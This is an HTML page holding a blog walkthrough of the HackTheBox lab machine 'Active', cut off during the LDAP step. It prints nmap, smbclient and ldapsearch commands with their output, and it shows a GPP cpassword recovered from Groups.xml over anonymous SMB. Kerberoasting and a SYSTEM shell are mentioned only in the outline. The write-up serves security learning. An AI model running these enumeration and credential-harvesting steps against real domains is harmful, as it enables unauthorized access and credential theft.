<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Active | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="Finding passwords in Group Policy Preferences and roasting Kerberos"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/active/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Active"><meta property="og:description" content="Finding passwords in Group Policy Preferences and roasting Kerberos"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/active/imgs/image-20210715131729216.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-07-15T13:17:29+07:00"><meta property="article:modified_time" content="2021-07-15T13:17:29+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/active/imgs/image-20210715131729216.png"><meta name=twitter:title content="HackTheBox - Active"><meta name=twitter:description content="Finding passwords in Group Policy Preferences and roasting Kerberos"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Active","item":"https://fahmifj.github.io/hackthebox/active/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Active","name":"HackTheBox - Active","description":"Finding passwords in Group Policy Preferences and roasting Kerberos","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Active is an Active Directory system, it starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). Using that credentials on LDAP reveals that the administrator account has a Service Principal Name attribute of a CIFS service. This leads to a Kerberoasting attack which allows attackers to obtain the password hash of administrator account and crack it. The cracked password is used to login remotely.\nSkills Learned Active Directory GPP Kerberoasting Tools Nmap Impacket CrackMapExec Reconnaissance Nmap A full TCP scan (after -p- performed) discovers a bunch of open ports. The most notable ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can assume that this is an Active Directory.\n→ kali@kali «active» «10.10.14.83» $ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 23:20 EDT Nmap scan report for 10.10.10.100 Host is up (0.072s latency). PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-11 03:20:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 4915/tcp closed frcs 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49169/tcp open msrpc Microsoft Windows RPC 49172/tcp open msrpc Microsoft Windows RPC 49180/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 4s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-07-11T03:21:48 |_ start_date: 2021-07-09T05:18:19 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 71.11 seconds nmap identified the domain name as active.htb and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) and PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I will consider these vulnerabilities as alternative methods and put them in separate post (Update! see PrintNightmare).\nEnumeration TCP 53 - DNS There is no zone transfer in this machine.\n→ kali@kali «active» «10.10.14.83» $ dig axfr @10.10.10.100 10.10.10.100 ; \u003c\u003c\u003e\u003e DiG 9.16.15-Debian \u003c\u003c\u003e\u003e axfr @10.10.10.100 10.10.10.100 ; (1 server found) ;; global options: +cmd ; Transfer failed. TCP 139,445 - SMB smbmap identifies that anonymous logon is allowed and it has read access on Replication share.\n→ kali@kali «active» «10.10.14.83» $ smbmap -u '' -p '' -H 10.10.10.100 [+] IP: 10.10.10.100:445 Name: active.htb Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server share Replication READ ONLY SYSVOL NO ACCESS Logon server share Users NO ACCESS Replication Share The Replication share contains a lot of folders. I will download them all recursively.\n→ kali@kali «active» «10.10.14.83» $ smbclient -N //10.10.10.100/Replication Anonymous login successful Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Sat Jul 21 06:37:44 2018 .. D 0 Sat Jul 21 06:37:44 2018 active.htb D 0 Sat Jul 21 06:37:44 2018 10459647 blocks of size 4096. 5722238 blocks available smb: \\\u003e recurse on smb: \\\u003e prompt of smb: \\\u003e mget * getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) ...[SNIP]... The only interesting file there is the Groups.xml.\n→ kali@kali «active.htb» «10.10.14.83» $ find . -type f -iname groups.xml ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml This groups.xml contains a cpassword of user active.htb\\SVC_TGS. I will note this password.\n→ kali@kali «active.htb» «10.10.14.83» $ cat ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e ","wordCount":"1790","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/active/imgs/image-20210715131729216.png","datePublished":"2021-07-15T13:17:29+07:00","dateModified":"2021-07-15T13:17:29+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/active/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Active</h1><p class=post-description>Finding passwords in Group Policy Preferences and roasting Kerberos</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>July 15, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>9 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-53---dns aria-label="TCP 53 - DNS">TCP 53 - DNS</a></li><li><a href=#tcp-139445---smb aria-label="TCP 139,445 - SMB">TCP 139,445 - SMB</a></li><li><a href=#tcp-389---ldap aria-label="TCP 389 - LDAP">TCP 389 - LDAP</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#access-as-svc_tgs aria-label="Access as SVC_TGS">Access as SVC_TGS</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-system aria-label="Shell as SYSTEM">Shell as SYSTEM</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/active/imgs/image-20210715131729216_hub1239d010de75227286410714aecb90f_144225_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/active/imgs/image-20210715131729216_hub1239d010de75227286410714aecb90f_144225_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/active/imgs/image-20210715131729216_hub1239d010de75227286410714aecb90f_144225_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/active/imgs/image-20210715131729216.png 739w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/active/imgs/image-20210715131729216.png alt="HackTheBox - Active" width=739 height=466><p>HackTheBox - Active</p></figure><p>Active is an Active Directory system, it starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). Using that credentials on LDAP reveals that the administrator account has a Service Principal Name attribute of a CIFS service. This leads to a Kerberoasting attack which allows attackers to obtain the password hash of administrator account and crack it. The cracked password is used to login remotely.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Active Directory GPP</li><li>Kerberoasting</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Impacket</li><li>CrackMapExec</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>A full TCP scan (after <code>-p-</code> performed) discovers a bunch of open ports. The most notable ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can assume that this is an Active Directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-07-10 23:20 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.100
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.072s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE  SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp    open   domain        Microsoft DNS 6.1.7601 <span class=o>(</span>1DB15D39<span class=o>)</span> <span class=o>(</span>Windows Server <span class=m>2008</span> R2 SP1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> dns-nsid: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  bind.version: Microsoft DNS 6.1.7601 <span class=o>(</span>1DB15D39<span class=o>)</span>
</span></span><span class=line><span class=cl>88/tcp    open   kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2021-07-11 03:20:53Z<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp   open   msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp   open   ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: active.htb, Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp   open   microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp   open   kpasswd5?
</span></span><span class=line><span class=cl>593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp   open   tcpwrapped
</span></span><span class=line><span class=cl>3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: active.htb, Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>3269/tcp  open   tcpwrapped
</span></span><span class=line><span class=cl>4915/tcp  closed frcs
</span></span><span class=line><span class=cl>5722/tcp  open   msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>9389/tcp  open   mc-nmf        .NET Message Framing
</span></span><span class=line><span class=cl>47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>49152/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49153/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49154/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49155/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>49169/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49172/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49180/tcp open   msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>Service Info: Host: DC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 4s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2021-07-11T03:21:48
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 2021-07-09T05:18:19
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 71.11 seconds
</span></span></code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) and PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I will consider these vulnerabilities as alternative methods and put them in separate post (Update! see <a href=https://fahmifj.github.io/blog/play-with-printnightmare/>PrintNightmare</a>).</p><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-53---dns>TCP 53 - DNS<a class=anchor aria-hidden=true href=#tcp-53---dns>#</a></h3><p>There is no zone transfer in this machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ dig axfr @10.10.10.100 10.10.10.100
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>;</span> &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.100 10.10.10.100
</span></span><span class=line><span class=cl><span class=p>;</span> <span class=o>(</span><span class=m>1</span> server found<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> global options: +cmd
</span></span><span class=line><span class=cl><span class=p>;</span> Transfer failed.
</span></span></code></pre></div><h3 id=tcp-139445---smb>TCP 139,445 - SMB<a class=anchor aria-hidden=true href=#tcp-139445---smb>#</a></h3><p><code>smbmap</code> identifies that anonymous logon is allowed and it has read access on <code>Replication</code> share.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ smbmap -u <span class=s1>&#39;&#39;</span> -p <span class=s1>&#39;&#39;</span> -H 10.10.10.100
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> IP: 10.10.10.100:445        Name: active.htb                                        
</span></span><span class=line><span class=cl>        Disk                                                    Permissions     Comment
</span></span><span class=line><span class=cl>        ----                                                    -----------     -------
</span></span><span class=line><span class=cl>        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class=line><span class=cl>        C$                                                      NO ACCESS       Default share
</span></span><span class=line><span class=cl>        IPC$                                                    NO ACCESS       Remote IPC
</span></span><span class=line><span class=cl>        NETLOGON                                                NO ACCESS       Logon server share 
</span></span><span class=line><span class=cl>        Replication                                             READ ONLY
</span></span><span class=line><span class=cl>        SYSVOL                                                  NO ACCESS       Logon server share 
</span></span><span class=line><span class=cl>        Users                                                   NO ACCESS
</span></span></code></pre></div><h4 id=replication-share>Replication Share<a class=anchor aria-hidden=true href=#replication-share>#</a></h4><p>The <code>Replication</code> share contains a lot of folders. I will download them all recursively.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ smbclient -N //10.10.10.100/Replication
</span></span><span class=line><span class=cl>Anonymous login successful
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Sat Jul <span class=m>21</span> 06:37:44 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Sat Jul <span class=m>21</span> 06:37:44 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  active.htb                          D        <span class=m>0</span>  Sat Jul <span class=m>21</span> 06:37:44 <span class=m>2018</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=m>10459647</span> blocks of size 4096. <span class=m>5722238</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> recurse on
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> prompt of
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> mget * 
</span></span><span class=line><span class=cl>getting file <span class=se>\a</span>ctive.htb<span class=se>\P</span>olicies<span class=se>\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class=o>}</span><span class=se>\G</span>PT.INI of size <span class=m>23</span> as active.htb/Policies/<span class=o>{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class=o>}</span>/GPT.INI <span class=o>(</span>0.1 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0.1 KiloBytes/sec<span class=o>)</span>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>The only interesting file there is the <code>Groups.xml</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active.htb» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ find . -type f -iname groups.xml                                                                            
</span></span><span class=line><span class=cl>./Policies/<span class=o>{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class=o>}</span>/MACHINE/Preferences/Groups/Groups.xml
</span></span></code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <strong>active.htb\SVC_TGS</strong>. I will note this password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active.htb» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ cat ./Policies/<span class=o>{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class=o>}</span>/MACHINE/Preferences/Groups/Groups.xml
</span></span><span class=line><span class=cl>&lt;?xml <span class=nv>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=nv>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span>?&gt;
</span></span><span class=line><span class=cl>&lt;Groups <span class=nv>clsid</span><span class=o>=</span><span class=s2>&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User <span class=nv>clsid</span><span class=o>=</span><span class=s2>&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;active.htb\SVC_TGS&#34;</span> <span class=nv>image</span><span class=o>=</span><span class=s2>&#34;2&#34;</span> <span class=nv>changed</span><span class=o>=</span><span class=s2>&#34;2018-07-18 20:46:06&#34;</span> <span class=nv>uid</span><span class=o>=</span><span class=s2>&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties <span class=nv>action</span><span class=o>=</span><span class=s2>&#34;U&#34;</span> <span class=nv>newName</span><span class=o>=</span><span class=s2>&#34;&#34;</span> <span class=nv>fullName</span><span class=o>=</span><span class=s2>&#34;&#34;</span> <span class=nv>description</span><span class=o>=</span><span class=s2>&#34;&#34;</span> <span class=nv>cpassword</span><span class=o>=</span><span class=s2>&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span class=nv>changeLogon</span><span class=o>=</span><span class=s2>&#34;0&#34;</span> <span class=nv>noChange</span><span class=o>=</span><span class=s2>&#34;1&#34;</span> <span class=nv>neverExpires</span><span class=o>=</span><span class=s2>&#34;1&#34;</span> <span class=nv>acctDisabled</span><span class=o>=</span><span class=s2>&#34;0&#34;</span> <span class=nv>userName</span><span class=o>=</span><span class=s2>&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
</span></span><span class=line><span class=cl>&lt;/Groups&gt;
</span></span></code></pre></div><h3 id=tcp-389---ldap>TCP 389 - LDAP<a class=anchor aria-hidden=true href=#tcp-389---ldap>#</a></h3><p>There is nothing much I can do in LDAP.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «active.htb» «10.10.14.83»  
</span></span><span class=line><span class=cl>$ ldapsearch -LLL -x -h 10.10.10.100 -s base namingContexts 
</span></span><span class=line><span class=cl>dn:
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>DC</span><span class=o>=</span>active,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>CN</span><span class=o>=</span>Configuration,DC<span class=o>=</span>active,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>CN</span><span class=o>=</span>Schema,CN<span class=o>=</span>Configuration,DC<span class=o>=</span>active,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>DC</span><span class=o>=</span>DomainDnsZones,DC<span class=o>=</span>active,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>DC</span><span class=o>=</span>ForestDnsZones,DC<span class=o>=</span>active,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>→ kali@kali «active» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ ldapsearch -LLL -x -h 10.10.10.100 -b <span class=s2>&#34;dc=active,dc=htb&#34;</span> 
</span></span><span class=line><span class=cl>Operations error <span class=o>(</span>1<span class=o>)</span>
</span></span><span class=line><span class=cl>Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful <span class=nb>bind</span> must be completed on the connection., data 0, v1db1
